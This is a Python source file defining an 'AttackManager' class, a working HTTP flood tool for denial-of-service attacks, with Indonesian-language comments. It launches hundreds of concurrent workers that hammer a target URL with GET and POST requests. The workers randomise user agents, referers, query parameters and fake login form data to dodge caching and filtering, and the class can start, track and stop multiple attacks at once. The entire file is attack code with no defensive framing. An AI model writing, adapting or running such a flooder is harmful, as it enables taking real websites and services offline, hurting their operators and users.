import threading
import time
import random
import string
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import uuid

class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.total_requests = 0
        self.start_time = time.time()
        self.executor = ThreadPoolExecutor(max_workers=500)
        
    def generate_random_user_agent(self):
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        return random.choice(agents)
    
    def generate_random_referer(self, target_url):
        referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.reddit.com/',
            target_url
        ]
        return random.choice(referers)
    
    async def http_flood_worker(self, target_url, attack_id, stop_event):
        headers = {
            'User-Agent': self.generate_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Referer': self.generate_random_referer(target_url)
        }
        
        async with aiohttp.ClientSession() as session:
            while not stop_event.is_set():
                try:
                    # Randomize request methods
                    method = random.choice(['GET', 'POST', 'HEAD'])
                    
                    # Add random query parameters
                    random_param = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    random_value = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
                    
                    if '?' in target_url:
                        attack_url = f"{target_url}&{random_param}={random_value}"
                    else:
                        attack_url = f"{target_url}?{random_param}={random_value}"
                    
                    # Randomize headers setiap request
                    headers['User-Agent'] = self.generate_random_user_agent()
                    
                    timeout = aiohttp.ClientTimeout(total=3)
                    
                    if method == 'POST':
                        # Random POST data
                        post_data = {
                            'username': ''.join(random.choices(string.ascii_letters, k=10)),
                            'password': ''.join(random.choices(string.ascii_letters + string.digits, k=15)),
                            'csrf_token': ''.join(random.choices(string.hexdigits, k=32))
                        }
                        async with session.post(attack_url, headers=headers, data=post_data, timeout=timeout) as resp:
                            pass
                    else:
                        async with session.get(attack_url, headers=headers, timeout=timeout) as resp:
                            pass
                    
                    self.total_requests += 1
                    
                    # Random delay antara 0.01 - 0.1 detik
                    await asyncio.sleep(random.uniform(0.01, 0.1))
                    
                except:
                    continue
    
    def launch_attack(self, target_url, threads=100, duration=60, attack_type='http_flood'):
        attack_id = str(uuid.uuid4())[:8]
        stop_event = threading.Event()
        
        async def attack_controller():
            tasks = []
            for _ in range(threads):
                task = asyncio.create_task(
                    self.http_flood_worker(target_url, attack_id, stop_event)
                )
                tasks.append(task)
            
            # Jalanin attack selama duration (detik)
            await asyncio.sleep(duration)
            stop_event.set()
            
            # Tunggu semua task selesai
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Hapus dari active attacks
            if attack_id in self.active_attacks:
                del self.active_attacks[attack_id]
        
        # Start attack di thread terpisah
        attack_thread = threading.Thread(target=lambda: asyncio.run(attack_controller()))
        attack_thread.start()
        
        self.active_attacks[attack_id] = {
            'target': target_url,
            'threads': threads,
            'duration': duration,
            'start_time': time.time(),
            'stop_event': stop_event,
            'thread': attack_thread
        }
        
        return attack_id
    
    def stop_attack(self, attack_id):
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]['stop_event'].set()
            del self.active_attacks[attack_id]
            return True
        return False
    
    def get_active_count(self):
        return len(self.active_attacks)
    
    def get_all_stats(self):
        attacks_info = []
        for aid, info in self.active_attacks.items():
            attacks_info.append({
                'id': aid,
                'target': info['target'],
                'elapsed': time.time() - info['start_time'],
                'threads': info['threads']
            })
        
        return {
            'active_attacks': attacks_info,
            'total_requests': self.total_requests,
            'uptime': time.time() - self.start_time
        }